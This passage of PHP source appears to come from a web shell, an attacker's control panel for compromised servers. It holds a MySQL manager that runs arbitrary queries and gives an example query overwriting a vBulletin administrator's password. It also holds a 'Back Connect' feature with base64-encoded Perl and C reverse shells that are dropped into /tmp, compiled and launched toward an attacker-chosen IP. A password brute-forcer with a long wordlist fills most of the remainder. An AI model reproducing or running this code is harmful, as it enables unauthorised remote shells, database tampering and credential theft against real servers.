            m(q("INSERT INTO $tablename ($keystr) VALUES ($valstr)") ? 'Insert new record of success' : mysql_error());
        }
    }
    if ($update && $insertsql && $base64) {
        $valstr = $tmp = '';
        foreach($insertsql as $key => $val) {
            $valstr .= $tmp.$key."='".addslashes($val)."'";
            $tmp = ',';
        }
        if ($valstr) {
            $where = base64_decode($base64);
            dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
            m(q("UPDATE $tablename SET $valstr WHERE $where LIMIT 1") ? 'Record updating' : mysql_error());
        }
    }
    if ($doing == 'del' && $base64) {
        $where = base64_decode($base64);
        $delete_sql = "DELETE FROM $tablename WHERE $where";
        dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
        m(q("DELETE FROM $tablename WHERE $where") ? 'Deletion record of success' : mysql_error());
    }

    if ($tablename && $doing == 'drop') {
        dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
        if (q("DROP TABLE $tablename")) {
            m('Drop table of success');
            $tablename = '';
        } else {
            m(mysql_error());
        }
    }

    $charsets = array(''=>'Default','gbk'=>'GBK', 'big5'=>'Big5', 'utf8'=>'UTF-8', 'latin1'=>'Latin1');

    formhead(array('title'=>'MYSQL Manager'));
    makehide('action','sqladmin');
    p('<p>');
    p('DBHost:');
    makeinput(array('name'=>'dbhost','size'=>20,'value'=>$dbhost));
    p(':');
    makeinput(array('name'=>'dbport','size'=>4,'value'=>$dbport));
    p('DBUser:');
    makeinput(array('name'=>'dbuser','size'=>15,'value'=>$dbuser));
    p('DBPass:');
    makeinput(array('name'=>'dbpass','size'=>15,'value'=>$dbpass));
    p('DBCharset:');
    makeselect(array('name'=>'charset','option'=>$charsets,'selected'=>$charset));
    makeinput(array('name'=>'connect','value'=>'Connect','type'=>'submit','class'=>'bt'));
    p('</p>');
    formfoot();
?>
<script type="text/javascript">
function editrecord(action, base64, tablename){
    if (action == 'del') {
        if (!confirm('Is or isn\'t deletion record?')) return;
    }
    $('recordlist').doing.value=action;
    $('recordlist').base64.value=base64;
    $('recordlist').tablename.value=tablename;
    $('recordlist').submit();
}
function moddbname(dbname) {
    if(!dbname) return;
    $('setdbname').dbname.value=dbname;
    $('setdbname').submit();
}
function settable(tablename,doing,page) {
    if(!tablename) return;
    if (doing) {
        $('settable').doing.value=doing;
    }
    if (page) {
        $('settable').page.value=page;
    }
    $('settable').tablename.value=tablename;
    $('settable').submit();
}
</script>
<?php
    // SQL
    formhead(array('name'=>'recordlist'));
    makehide('doing');
    makehide('action','sqladmin');
    makehide('base64');
    makehide('tablename');
    p($dbform);
    formfoot();

    // Data
    formhead(array('name'=>'setdbname'));
    makehide('action','sqladmin');
    p($dbform);
    if (!$dbname) {
        makehide('dbname');
    }
    formfoot();


    formhead(array('name'=>'settable'));
    makehide('action','sqladmin');
    p($dbform);
    makehide('tablename');
    makehide('page',$page);
    makehide('doing');
    formfoot();

    $cachetables = array();
    $pagenum = 30;
    $page = intval($page);
    if($page) {
        $start_limit = ($page - 1) * $pagenum;
    } else {
        $start_limit = 0;
        $page = 1;
    }
    if (isset($dbhost) && isset($dbuser) && isset($dbpass) && isset($connect)) {
        dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
        // get mysql server
        $mysqlver = mysql_get_server_info();
        p('<p>MySQL '.$mysqlver.' running in '.$dbhost.' as '.$dbuser.'@'.$dbhost.'</p>');
        $highver = $mysqlver > '4.1' ? 1 : 0;

        // Show database
        $query = q("SHOW DATABASES");
        $dbs = array();
        $dbs[] = '-- Select a database --';
        while($db = mysql_fetch_array($query)) {
            $dbs[$db['Database']] = $db['Database'];
        }
        makeselect(array('title'=>'Please select a database:','name'=>'db[]','option'=>$dbs,'selected'=>$dbname,'onchange'=>'moddbname(this.options[this.selectedIndex].value)','newline'=>1));
        $tabledb = array();
        if ($dbname) {
            p('<p>');
            p('Current dababase: <a href="javascript:moddbname(\''.$dbname.'\');">'.$dbname.'</a>');
            if ($tablename) {
                p(' | Current Table: <a href="javascript:settable(\''.$tablename.'\');">'.$tablename.'</a> [ <a href="javascript:settable(\''.$tablename.'\', \'insert\');">Insert</a> | <a href="javascript:settable(\''.$tablename.'\', \'structure\');">Structure</a> | <a href="javascript:settable(\''.$tablename.'\', \'drop\');">Drop</a> ]');
            }
            p('</p>');
            mysql_select_db($dbname);

            $getnumsql = '';
            $runquery = 0;
            if ($sql_query) {
                $runquery = 1;
            }
            $allowedit = 0;
            if ($tablename && !$sql_query) {
                $sql_query = "SELECT * FROM $tablename";
                $getnumsql = $sql_query;
                $sql_query = $sql_query." LIMIT $start_limit, $pagenum";
                $allowedit = 1;
            }
            p('<form action="'.$self.'" method="POST">');
            p('<p><table width="200" border="0" cellpadding="0" cellspacing="0"><tr><td colspan="2">Run SQL query/queries on database <font color=red><b>'.$dbname.'</font></b>:<BR>Example VBB Password: <font color=red>vbateam</font><BR><font color=yellow>UPDATE `user` SET `password` = \'69e53e5ab9536e55d31ff533aefc4fbe\', salt = \'p5T\' WHERE `userid` = \'1\' </font>
            </td></tr><tr><td><textarea name="sql_query" class="area" style="width:600px;height:50px;overflow:auto;">'.htmlspecialchars($sql_query,ENT_QUOTES).'</textarea></td><td style="padding:0 5px;"><input class="bt" style="height:50px;" name="submit" type="submit" value="Query" /></td></tr></table></p>');
            makehide('tablename', $tablename);
            makehide('action','sqladmin');
            p($dbform);
            p('</form>');
            if ($tablename || ($runquery && $sql_query)) {
                if ($doing == 'structure') {
                    $result = q("SHOW COLUMNS FROM $tablename");
                    $rowdb = array();
                    while($row = mysql_fetch_array($result)) {
                        $rowdb[] = $row;
                    }
                    p('<table border="0" cellpadding="3" cellspacing="0">');
                    p('<tr class="head">');
                    p('<td>Field</td>');
                    p('<td>Type</td>');
                    p('<td>Null</td>');
                    p('<td>Key</td>');
                    p('<td>Default</td>');
                    p('<td>Extra</td>');
                    p('</tr>');
                    foreach ($rowdb as $row) {
                        $thisbg = bg();
                        p('<tr class="fout" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'fout\';">');
                        p('<td>'.$row['Field'].'</td>');
                        p('<td>'.$row['Type'].'</td>');
                        p('<td>'.$row['Null'].'&nbsp;</td>');
                        p('<td>'.$row['Key'].'&nbsp;</td>');
                        p('<td>'.$row['Default'].'&nbsp;</td>');
                        p('<td>'.$row['Extra'].'&nbsp;</td>');
                        p('</tr>');
                    }
                    tbfoot();
                } elseif ($doing == 'insert' || $doing == 'edit') {
                    $result = q('SHOW COLUMNS FROM '.$tablename);
                    while ($row = mysql_fetch_array($result)) {
                        $rowdb[] = $row;
                    }
                    $rs = array();
                    if ($doing == 'insert') {
                        p('<h2>Insert new line in '.$tablename.' table &raquo;</h2>');
                    } else {
                        p('<h2>Update record in '.$tablename.' table &raquo;</h2>');
                        $where = base64_decode($base64);
                        $result = q("SELECT * FROM $tablename WHERE $where LIMIT 1");
                        $rs = mysql_fetch_array($result);
                    }
                    p('<form method="post" action="'.$self.'">');
                    p($dbform);
                    makehide('action','sqladmin');
                    makehide('tablename',$tablename);
                    p('<table border="0" cellpadding="3" cellspacing="0">');
                    foreach ($rowdb as $row) {
                        if ($rs[$row['Field']]) {
                            $value = htmlspecialchars($rs[$row['Field']]);
                        } else {
                            $value = '';
                        }
                        $thisbg = bg();
                        p('<tr class="fout" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'fout\';">');
                        p('<td><b>'.$row['Field'].'</b><br />'.$row['Type'].'</td><td><textarea class="area" name="insertsql['.$row['Field'].']" style="width:500px;height:60px;overflow:auto;">'.$value.'</textarea></td></tr>');
                    }
                    if ($doing == 'insert') {
                        p('<tr class="fout"><td colspan="2"><input class="bt" type="submit" name="insert" value="Insert" /></td></tr>');
                    } else {
                        p('<tr class="fout"><td colspan="2"><input class="bt" type="submit" name="update" value="Update" /></td></tr>');
                        makehide('base64', $base64);
                    }
                    p('</table></form>');
                } else {
                    $querys = @explode(';',$sql_query);
                    foreach($querys as $num=>$query) {
                        if ($query) {
                            p("<p><b>Query#{$num} : ".htmlspecialchars($query,ENT_QUOTES)."</b></p>");
                            switch(qy($query))
                            {
                                case 0:
                                    p('<h2>Error : '.mysql_error().'</h2>');
                                    break;
                                case 1:
                                    if (strtolower(substr($query,0,13)) == 'select * from') {
                                        $allowedit = 1;
                                    }
                                    if ($getnumsql) {
                                        $tatol = mysql_num_rows(q($getnumsql));
                                        $multipage = multi($tatol, $pagenum, $page, $tablename);
                                    }
                                    if (!$tablename) {
                                        $sql_line = str_replace(array("\r", "\n", "\t"), array(' ', ' ', ' '), trim(htmlspecialchars($query)));
                                        $sql_line = preg_replace("/\/\*[^(\*\/)]*\*\//i", " ", $sql_line);
                                        preg_match_all("/from\s+`{0,1}([\w]+)`{0,1}\s+/i",$sql_line,$matches);
                                        $tablename = $matches[1][0];
                                    }
                                    $result = q($query);
                                    p($multipage);
                                    p('<table border="0" cellpadding="3" cellspacing="0">');
                                    p('<tr class="head">');
                                    if ($allowedit) p('<td>Action</td>');
                                    $fieldnum = @mysql_num_fields($result);
                                    for($i=0;$i<$fieldnum;$i++){
                                        $name = @mysql_field_name($result, $i);
                                        $type = @mysql_field_type($result, $i);
                                        $len = @mysql_field_len($result, $i);
                                        p("<td nowrap>$name<br><span>$type($len)</span></td>");
                                    }
                                    p('</tr>');
                                    while($mn = @mysql_fetch_assoc($result)){
                                        $thisbg = bg();
                                        p('<tr class="fout" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'fout\';">');
                                        $where = $tmp = $b1 = '';
                                        foreach($mn as $key=>$inside){
                                            if ($inside) {
                                                $where .= $tmp.$key."='".addslashes($inside)."'";
                                                $tmp = ' AND ';
                                            }
                                            $b1 .= '<td nowrap>'.html_clean($inside).'&nbsp;</td>';
                                        }
                                        $where = base64_encode($where);
                                        if ($allowedit) p('<td nowrap><a href="javascript:editrecord(\'edit\', \''.$where.'\', \''.$tablename.'\');">Edit</a> | <a href="javascript:editrecord(\'del\', \''.$where.'\', \''.$tablename.'\');">Del</a></td>');
                                        p($b1);
                                        p('</tr>');
                                        unset($b1);
                                    }
                                    tbfoot();
                                    p($multipage);
                                    break;
                                case 2:
                                    $ar = mysql_affected_rows();
                                    p('<h2>affected rows : <b>'.$ar.'</b></h2>');
                                    break;
                            }
                        }
                    }
                }
            } else {
                $query = q("SHOW TABLE STATUS");
                $table_num = $table_rows = $data_size = 0;
                $tabledb = array();
                while($table = mysql_fetch_array($query)) {
                    $data_size = $data_size + $table['Data_length'];
                    $table_rows = $table_rows + $table['Rows'];
                    $table['Data_length'] = sizecount($table['Data_length']);
                    $table_num++;
                    $tabledb[] = $table;
                }
                $data_size = sizecount($data_size);
                unset($table);
                p('<table border="0" cellpadding="0" cellspacing="0">');
                p('<form action="'.$self.'" method="POST">');
                makehide('action','sqladmin');
                p($dbform);
                p('<tr class="head">');
                p('<td width="2%" align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td>');
                p('<td>Name</td>');
                p('<td>Rows</td>');
                p('<td>Data_length</td>');
                p('<td>Create_time</td>');
                p('<td>Update_time</td>');
                if ($highver) {
                    p('<td>Engine</td>');
                    p('<td>Collation</td>');
                }
                p('</tr>');
                foreach ($tabledb as $key => $table) {
                    $thisbg = bg();
                    p('<tr class="fout" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'fout\';">');
                    p('<td align="center" width="2%"><input type="checkbox" name="table[]" value="'.$table['Name'].'" /></td>');
                    p('<td><a href="javascript:settable(\''.$table['Name'].'\');">'.$table['Name'].'</a> [ <a href="javascript:settable(\''.$table['Name'].'\', \'insert\');">Insert</a> | <a href="javascript:settable(\''.$table['Name'].'\', \'structure\');">Structure</a> | <a href="javascript:settable(\''.$table['Name'].'\', \'drop\');">Drop</a> ]</td>');
                    p('<td>'.$table['Rows'].'</td>');
                    p('<td>'.$table['Data_length'].'</td>');
                    p('<td>'.$table['Create_time'].'</td>');
                    p('<td>'.$table['Update_time'].'</td>');
                    if ($highver) {
                        p('<td>'.$table['Engine'].'</td>');
                        p('<td>'.$table['Collation'].'</td>');
                    }
                    p('</tr>');
                }
                p('<tr class=fout>');
                p('<td>&nbsp;</td>');
                p('<td>Total tables: '.$table_num.'</td>');
                p('<td>'.$table_rows.'</td>');
                p('<td>'.$data_size.'</td>');
                p('<td colspan="'.($highver ? 4 : 2).'">&nbsp;</td>');
                p('</tr>');

                p("<tr class=\"fout\"><td colspan=\"".($highver ? 8 : 6)."\"><input name=\"saveasfile\" value=\"1\" type=\"checkbox\" /> Save as file <input class=\"input\" name=\"path\" value=\"".SA_ROOT.$_SERVER['HTTP_HOST']."_MySQL.sql\" type=\"text\" size=\"60\" /> <input class=\"bt\" type=\"submit\" name=\"downrar\" value=\"Export selection table\" /></td></tr>");
                makehide('doing','backupmysql');
                formfoot();
                p("</table>");
                fr($query);
            }
        }
    }
    tbfoot();
    @mysql_close();
}//end sql backup


elseif ($action == 'backconnect') {
    !$yourip && $yourip = $_SERVER['REMOTE_ADDR'];
    !$yourport && $yourport = '12345';
    $usedb = array('perl'=>'perl','c'=>'c');

    $back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj".
        "aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR".
        "hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT".
        "sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI".
        "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi".
        "KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl".
        "OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
    $back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC".
        "BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb".
        "SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd".
        "KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ".
        "sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC".
        "Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D".
        "QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp".
        "Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";

    if ($start && $yourip && $yourport && $use){
        if ($use == 'perl') {
            cf('/tmp/angel_bc',$back_connect);
            $res = execute(which('perl')." /tmp/angel_bc $yourip $yourport &");
        } else {
            cf('/tmp/angel_bc.c',$back_connect_c);
            $res = execute('gcc -o /tmp/angel_bc /tmp/angel_bc.c');
            @unlink('/tmp/angel_bc.c');
            $res = execute("/tmp/angel_bc $yourip $yourport &");
        }
        m("Now script try connect to $yourip port $yourport ...");
    }

    formhead(array('title'=>'Back Connect'));
    makehide('action','backconnect');
    p('<p>');
    p('Your IP:');
    makeinput(array('name'=>'yourip','size'=>20,'value'=>$yourip));
    p('Your Port:');
    makeinput(array('name'=>'yourport','size'=>15,'value'=>$yourport));
    p('Use:');
    makeselect(array('name'=>'use','option'=>$usedb,'selected'=>$use));
    makeinput(array('name'=>'start','value'=>'Start','type'=>'submit','class'=>'bt'));
    p('</p>');
    formfoot();
}//end backconnect window via NC

// Brute
elseif ($action == 'brute') {
formhead(array('title'=>'Brute Forcer'));
    makehide('action','brute');
    makehide('dir',$brute);
@ini_set('memory_limit', 1000000000000);
$connect_timeout=5;
@set_time_limit(0);
$submit = $_REQUEST['submit'];
$users = $_REQUEST['users'];
$pass = $_REQUEST['passwords'];
$target = $_REQUEST['target'];
$option = $_REQUEST['option'];


$passlist = "0123456
01234567
012345678
0123456789
01234567890
123456
1234567
12345678
123456789
1234567890
111111
000000
222222
333333
444444
555555
666666
777777
888888
999999
123123
456456
789789
123321
456654
654321
7654321
87654321
987654321
0987654321
admin
administrator
admincp
cpanel
adminx
admins
password
passwords
passw0rd
p@ssw0rd
p@ssword
khongco
25251325
autolink
goodieal
proyecto
ciberadi
eldelcab
district
maravila
conquerl
digitali
kampfmus
samaaloj
easydraw
enviarma
tapizalo
jamhostc
montzezi
yogaaloj
teamomar
impactoo
mindozon
tibiaota
werlinal
getabalo
getajalo
pcrupalc
distric1
adelfasa
mkunorte
teamoma1
mkunort2
pruebaal
liceopru
losmango
losmang1
cuscoice
cuscoic1
reytryli
distric2
pokemonf
compunet
mejorcur
adivinar
sexycali
xxxxxxal
animealo
rlevaloj
clangeop
txmaloja
ernestnu
cursofor
cursofo1
conejobr
cursofo3
cursitow
cursofo4
practica
cursoweb
pescador
polingan
monolila
manolila
cursofo5
cursodis
rcolombo
sweethea
practic1
chatpara
cuscoppa
musicali
easydra1
rojoaloj
ropaycal
cruzroja
mujeresi
theartbo
zelaiaal
pablocl
blopacom
emeterio
poesiaal
condambu
lenredve
tropicoa
tropiala
asardomo
radiocen
angeldes
mudkdnci
chiizflo
puchshop
mondideo
alxtecno
esmianim
gsnoegaa
aguilane
dendrali
confianz
managerf
descargo
descarg1
speedclu
tuningce
sancleme
tranamne
luigohou
accesoli
fireyoua
gimnasio
charchia
underblo
donasmsa
esmiani2
yastbalo
fullzone
soportec
autosjan
mundoirr
lawebdel
solalbac
infonoaa
castingw
yupranam
palaaloj
alejandr
hablemos
muchoalo
diablodq
grandtal
infogran
joomlaex
spyactio
surungaa
pelionli
malditor
lenceraa
redfamil
wowdeant
copitoba
santpere
santper1
imparabl
imparab1
historia
hernanfe
hernanf1
disadams
ignasich
animeloo
sylenzer
pilaralo
aurealoj
mundoani
mundodan
estheral
desireea
eloisaal
jesusalo
mundoend
carlosra
humberto
animalwo
cobialoj
dinastia
postworl
lososcar
locosdeg
nealcaro
promocio
inceresc
posteaco
larimarc
simumala
calidady
ebookspo
pjfaloja
tabacoba
tiendaal
minister
orgindal
deadall2
mcgaleri
sylenze1
elkhryzc
gamewico
majoande
animexxx
justinti
arinvade
loskuate
olideoli
jauplaes
kortoses
webdigit
micropai
elitespa
tabacob1
tawingco
daviliyo
familiaf
aberonch
danzaori
cristina
ganaderi
susanaol
labookli
fitotcsa
kendrick
plastico
baoscom
chuchove
ganader1
ganader4
peluquer
decoraci
peluque1
quebiene
redescub
miperual
esmerald
superlab
esmeral1
albandal
topoclan
javamerc
magnolia
magnoli1
tienduki
elitemex
novedade
neotavia
equitaci
equitac1
tiendala
josebaga
balitems
dgcyedie
mueblest
nitidord
derechoa
ocioneal
unpocode
proyect1
dmarqalo
yakiliaa
gafasrol
hugoherr
gafasro1
megaelec
sbdinoxa
sigaloja
animewar
pruebasw
romozaal
malagaes
silverne
mueblesd
trabajof
zombieho
zinfinal
casarura
geekaloj
zombieh1
mionepie
chatroma
chatrom1
zombiecr
mixerhos
consulta
consult2
cacareos
anunciad
anuncia1
xportale
webglamo
lapdeval
clanrpdt
scamspru
portalal
barranca
valerose
minegoci
artecomp
penguin1
caribero
fotozone
facebook
respaldo
barranc5
chimaych
unicorpc
periodis
elviejod
poodlepi
almacene
nanicom
cataplun
antojito
moxycom
penguina
perurock
mjparato
golfespi
pevencio
futbolit
ultimate
diagrama
sinroche
sinroch2
espektor
alojamie
jofrecie
oxwallhi
sinroch3
federico
diediped
epocarma
demoaloj
urtsrcom
proyect2
taringam
urtsrnet
todopeli
overload
clubsjne
judajaal
faltaelr
reactord
terminil
postinet
mandalea
ultimat1
programd
judajaco
edosmalo
imediaal
unitutos
carlosga
javieral
iparfolk
tutorial
marcosla
ganzualo
sebasgal
danielbe
ganzuual
sebasalo
programa
nuevoalo
paranoid
mugamezo
burgosim
reactor1
moneyint
wecanaal
subrerue
femmealo
codinafi
nekoente
bolivara
bzunigac
flayfmtk
gamersam
canalmuj
blacknew
aldeaswe
zetingan
zetingaa
klaixalo
supersub
spycptk
gaudibyy
lomejord
comprarj
compramo
sconterc
scontera
scoaloja
hayatzik
izlanmix
xuquerin
mipagina
feinkalo
djmusica
electror
elvalord
mendigol
cucutraa
ninauwap
diegobed
fobiaalo
radiofob
desarrol
managuaa
aprendiz
pruevaal
mpingeni
zonavipc
ultimat2
patapamn
chollosr
apdhosti
pygtecno
screenva
getzaloj
siccserv
institut
mifarmac
ingenier
siccser1
siccupal
siccser2
siccser3
siccser4
siccaloj
siccalo1
redentos
spainrca
postine2
nytroxel
deskerin
deskipos
rokaneta
yosoyhum
xdnetalo
proyect3
siccacdc
siccaero
tribalmu
siccalex
siccales
siccalej
siccamar
siccanto
siccantr
siccapoc
mysystem
tallerde
viabcpco
emudesca
operaloj
avestami
socialb1
formular
getzvalo
pornetal
essocial
goodnetc
frientsa
siitinge
maniacos
comprapt
zemexalo
pornexal
niniialo
mundofta
nahueltr
zonafull
zonaful1
saspcom
saspaloj
avistami
zemexima
zoomixal
exprezzt
margacom
coleccio
skateboo
dragonxt
etpaisva
emudesc1
latinosg
divertpo
deskeri1
chakowap
xtremoal
creasweb
elitefor
zanimeze
paperpos
estacaga
download
pxdcomar
pxdcoma1
josevent
rolabela
zettabyt
postimax
zemexdal
preprens
msnlives
mjmautom
jhposter
cmilyes
redameri
posteado
laputaal
sdfgdrgd
paradord
cdonzoni
fighterp
gentepar
fastmoon
xtrempos
radiosta
flowpren
tumundon
botigaco
coopera2
personaa
vayaqrit
parador1
ifarazob
oaktreec
masterpo
masterp1
superpos
universa
univers1
swingerl
metaloja
animextr
alejolun
tuzonafu
chilenos
xonagame
zinflowa
mwextrem
extremer
extremea
mundopos
correosd
tremixal
youneral
colegio1
wolfuser
kerverus
neuquino
fzonealo
peoplesa
miespaci
spminecr
spminec1
citypost
chileno1
sharingt
imfranet
activers
descarg3
fullpost
gsdfilms
unartesa
tovaring
elrincon
insanean
zemexdda
karingaa
vickybal
silverte
juegoson
karinga1
todakarh
webmaste
imagexal
mulotera
katringa
topwarez
vicmanal
xpenguin
fakebktk
extrempo
infiltra
tetcarge
dantoxal
mrzannae
fasobook
producto
proyect4
socialpo
callofdu
plenascu
androidt
angaroac
sumakkaw
haguerua
xtremepo
colineal
colinecz
juegoshx
dubingax
luningax
juegosde
nytroxe1
zonapost
zonapos1
concerti
netaloja
postcomp
herculin
zemexal1
zemexal2
imoaloja
wenminga
paramore
paramor1
hablando
xiaohana
postfire
bbsaloja
hmdxzalo
hnet
blogbary
isepchot
jrmaloja
muchmonk
reedaloj
fpfgecor
sunbbtk
xbynet
bloogecn
com
zgwaloja
bcpzonas
poxteaal
molianal
hiperwap
hiviyalo
uuxnaloj
alojami1
iseealoj
passport
hktk
wapaloja
lianchen
accesoal
juanalva
miugames
wiihubal
onzonill
clubdepo
huaeralo
nsqaloja
rainntk
cnkeleal
ajmbrite
zuolsalo
mvbaaloj
pclanalo
mymusict
xtremep1
idkdkalo
ishaloja
rezaaloj
dubiosta
parsagig
parsdata
autopilo
faronlin
katring1
flipaloj
noviaalo
hotfilem
nhihuyen
beshoyal
bpalojam
wwwwaloj
qqalojam
zingupus
wongtowa
wongtow1
queposta
queposte
pruebasa
postead1
kalojami
yichanga
proomalo
itroomal
rapidgoi
proomir
parsaweb
proomin
xinmealo
sancasia
infoxtal
ihostalo
waringaa
nachotut
ariegmin
whityalo
inoobalo
googleal
cpxcpalo
haiguial
etaxtk
digitela
dangeloa
jinjinal
skytowna
todospos
todopost
centrode
comar
freecucc
picbaryi
meraloja
unicc
xiaojiaj
rajowang
livemsna
mallorc1
poolaloj
tecnoima
aloyaloj
maxaloja
erolozka
katring2
esbaloja
pexinter
adventis
xxxaloja
freepalo
posteros
xkatring
adventi1
maniacal
iwalojam
esbnaloj
eltorria
ccardche
twindril
newyorku
appaloja
pablopuy
bizst
yktaxial
fcuzanet
ironfist
ironfis1
guzhoual
xxinfo
ykxywalo
pexaloja
wuupsalo
propreal
lovesolo
psmpcoma
lolailoa
komialoj
vivpnalo
apjpaloj
centroyo
emirualo
erikoalo
momokaal
djpatrix
oiloilun
newyorka
oiloilal
guzerlea
miyualoj
ayaaloja
yurialoj
remolach
xoniaalo
tlmobile
falaciam
falacimi
generaci
katring3
rirroksa
daxinves
mexicooc
dabaitwo
ypuntoal
contrail
intelige
momoaloj
sakialoj
mireialo
yumialoj
erikaalo
misaaloj
tablasal
pruebas1
gimnasi1
chiledes
tecwarez
dgjhwtk
ckmaloja
miyabial
emirialo
yuualoja
henrydan
songokuh
elovealo
cloobtga
aportand
predicas
traviano
aikoaloj
miyanoal
nishialo
webaloja
mipagin1
mipagin2
erenaalo
bakualoj
ninaaloj
adiction
arinvasi
tk1
linyumin
troringa
royaldar
zonasegu
ingeniow
asshaloj
ministe1
bbvaaloj
appaloj1
clubpeng
mikjaloj
aidaaloj
amikoalo
yoshialo
rustilor
todoxlav
bbsaloj1
pruebamo
imagenes
mimundox
finsisal
yangappt
ptxmtk
ratontra
supertes
sogbalal
tkidcalo
adictoal
taringon
teamnerd
conocerc
guiamama
museolil
museoli1
museodel
rockenca
rutastra
pruebahi
museoli2
museoli3
alejand1
hipermed
trabajos
calidanc
willygar
deprueba
fastqual
orquesta
micarrer
animales
notiwebv
elvisate
proyect5
pruebapr
lauramed
museoli4
gastrono
museouao
musicade
fundacio
fundaci1
noticias
danielal
angelaca
noticier
uaomuseo
lilimuse
museoli5
autonomo
zuringaa
prismaca
unknownc
lilimus2
zonajove
pruebuch
ejercici
elcapiro
marilond
marilon1
lauralon
marilon2
anniekit
vanegarf
nuestras
tenisuao
educorte
papualoj
valeriac
estefani
angelesa
angelame
opiniont
hiperme1
cecucola
grupolat
pruebasr
razorcom
chapinal
desayuno
stylerol
mispagin
miorutas
estudior
arieldes
hiperme2
juanfern
ssscc
parsawe1
tarjetas
etiqueta
teamner2
mpnkaloj
museode1
pelisvip
rookierc
pesepero
peseper1
smixdavi
chilehot
museoli6
muselili
wwalojam
turingaa
gentepac
megapecc
megapec1
paginava
paginav1
katring4
mariaalo
hilfealo
katring5
kuaigoal
faceboo1
quintero
quinter1
synccocc
pajonale
pajonal1
zonepost
museoli7
mmopadco
museoli8
museoli9
exaraesa
autonoma
museol10
museol11
buutubea
museol12
museol13
museolli
joisaloj
rotional
bishojoa
museol14
museol15
qtusoalo
uaomuse1
wikipais
aspcom
aspaloja
freedeyu
majoialo
feelings
parapalo
qgcom
tallerpi
tupuedes
shieraal
rerealoj
raisealo
katatumu
mysshalo
gestione
lospresi
loadmach
potringa
arnlover
bbsaloj4
gulongco
demoreda
xdiringa
kevindow
tecbokal
tecnofac
tusantia
newtarin
ymbnet
natalyzx
barcaalo
shajaalo
endaaloj
zenzaloj
imilialo
proband1
martinbe
loseweig
peoplesc
natalyal
atotialo
beinaloj
seetaloj
terialoj
xbycndsr
ghometk
dnfbytk
xxyyin
ingenio1
miraialo
endanalo
quitaalo
pepualoj
scbaloja
rainaloj
haciendo
hesaaloj
dltaloja
meealoja
apoialoj
merwaloj
agealoja
shiealoj
mumaaloj
pinaloja
applepie
cuerpoym
futbolpa
elrinco1
tk12
tk123
ymfaloja
homeloan
xhhtk
flowmund
reihitsu
megaring
uaolilim
dnafminf
cocetrin
xuantian
kbqnaloj
mueblesr
hostaloj
jorgealo
fanlicoc
computod
blackalo
maxiahor
crearteo
venookcn
eltuguri
catringa
citypos1
lywgaloj
nanaaloj
koharual
ozawaalo
houaloja
partryco
bibliopa
skatepos
sinrestr
canvasal
futbolea
grupobah
melodyes
womanes
bikines
danceres
pancecul
calidan1
calidanz
culturap
pancecu2
calicult
calicul2
calipanc
americap
luispanc
dgratisa
dancere3
vanillae
fanmlial
bajargra
xdmovies
dxmoviea
dxmovies
katring6
isaitube
pancealo
pancecu3
umocaloj
conocerz
michelev
sexosinp
pilotalo
traninga
bloodlin
poliseso
tumascot
blablato
dulcebes
mundopo1
iglesiar
gimnasi2
xonapost
guiamam1
studenta
miniprof
minipro1
unidadre
tmusical
flordeca
unidadr2
aguablan
aguabla1
hablamea
vidasalu
lasucurs
